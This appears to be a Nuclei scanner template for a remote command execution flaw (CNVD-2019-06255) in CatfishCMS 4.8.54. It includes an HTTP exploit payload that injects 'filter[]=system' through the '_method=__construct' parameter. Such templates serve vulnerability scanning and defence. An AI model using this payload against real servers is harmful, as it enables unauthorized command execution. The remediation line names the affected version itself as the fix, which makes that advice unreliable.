# Nuclei Template: CatfishCMS - Remote Command Execution
**Template ID:** CNVD-2019-06255
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`CNVD-2019-06255.yaml`)

## Vulnerability Information & PoC

## Description
CatfishCMS 4.8.54 contains a remote command execution vulnerability in the "method" parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}
GET {{BaseURL}}/s=set&_method=__construct&method=*&filter[]=system
```

## Remediation
Upgrade to CatfishCMS version 4.8.54 or later.
